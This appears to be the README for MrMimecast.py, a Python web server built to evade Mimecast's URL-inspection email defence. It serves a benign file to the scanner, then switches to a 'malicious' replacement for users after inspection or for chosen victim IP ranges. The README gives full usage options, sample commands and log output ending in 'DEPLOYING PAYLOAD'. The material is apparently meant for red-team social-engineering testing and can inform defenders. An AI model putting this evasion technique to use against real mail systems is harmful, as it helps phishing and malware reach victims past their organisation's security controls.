# MrMimecast.py
Host web content and modify the response based on the visitor.

Originally written to evade Mimecast Targeted Threat Protection - URL Inspection:
- https://netspi.com/blog/technical/social-engineering/bypassing-mimecast-email-defenses/
- https://www.youtube.com/watch?v=H_KY2oY5ytA
## Options
```
[~] ./MrMimecast.py -h
usage: MrMimecast.py [-h] [-i IP] [-p PORT] [--tls] [-c CERT] [-k KEY] [-o OUTPUT] [-n NETWORK] -d DEFAULT -r REPLACE -m MASK

Mimecast Targeted Threat Protection / URL inspection evasion tool.

optional arguments:
  -h, --help            show this help message and exit

Web server configuration:
  -i IP, --ip IP        Listening interface [Default: 0.0.0.0]
  -p PORT, --port PORT  Listening port [Default: 80]
  --tls                 Enable SSL/TLS
  -c CERT, --cert CERT  TLS certificate (.pem)
  -k KEY, --key KEY     TLS key (.pem)
  -o OUTPUT, --output OUTPUT
                        Save web logs to file

Rulesets:
  -n NETWORK, --network NETWORK
                        Victim network range [Single IP or CIDR notation]

Web content:
  -d DEFAULT, --default DEFAULT
                        Path to default web content
  -r REPLACE, --replace REPLACE
                        Path to replacement / malicious file
  -m MASK, --mask MASK  Filename shown to visitors
```

## Sample Commands
```
./MrMimecast.py key.pem -d safe.txt -r malicious.txt -m thisisafile.txt
```
- Start HTTP web server on port 80
- Return "safe.txt" to visitors by default
- Return "malicious.txt" to users after Mimecast inspection
- With "thisisafile.txt" as the filename for both

```
./MrMimecast.py -p 443 --tls -c cert.pem -k key.pem -d safe.txt -r malicious.txt -m thisisafile.txt -o web-output.log
```
- Start HTTPS web server on port 443
- Return "safe.txt" to visitors by default
- Return "malicious.txt" to users after Mimecast inspection
- With "thisisafile.txt" as the filename for both
- Write visitor logs to "web-output.log" (includes visitor IP and full HTTP request headers)

```
./MrMimecast.py -p 8443 --tls -c cert.pem -k key.pem -d safe.txt -r malicious.txt -m thisisafile.txt -n 192.168.86.0/24 -n 172.16.0.0/16
```
- Start HTTPS web server on port 8443
- Return "safe.txt" to visitors by default
- Return "malicious.txt" to users after Mimecast inspection
- With "thisisafile.txt" as the filename for both
- Always return "malicious.txt" to users visiting from an IP within 192.168.86.0/24 or 172.16.0.0/16
## Example
```
[~] ./MrMimecast.py -p 443 --tls -c cert.pem -k key.pem -d safe.txt -r malicious.txt -m justafile.txt
LISTENER:               0.0.0.0:443

DEFAULT CONTENT:        safe.txt
REPLACEMENT:            malicious.txt
VISIBLE FILENAME:       justafile.txt

Enter PEM pass phrase:



|    MR.MIME USED REFLECT     |
|                             |


Waiting for visitors...

X.X.X.X - - [19/Oct/2022 13:51:58] "GET / HTTP/1.1" 200 -
[*] SERVING DEFAULT CONTENT

Y.Y.Y.Y - - [19/Oct/2022 13:52:18] "GET / HTTP/1.1" 200 -
[*] SERVING DEFAULT CONTENT

[*] MIMECAST HEADER DETECTED. MODIFYING NEXT RESPONSE.

X.X.X.X - - [19/Oct/2022 13:52:24] "GET / HTTP/1.1" 200 -
[*] DEPLOYING PAYLOAD

X.X.X.X - - [19/Oct/2022 13:52:26] "GET / HTTP/1.1" 200 -
[*] SERVING DEFAULT CONTENT

X.X.X.X - - [19/Oct/2022 13:52:29] "GET / HTTP/1.1" 200 -
[*] SERVING DEFAULT CONTENT
```
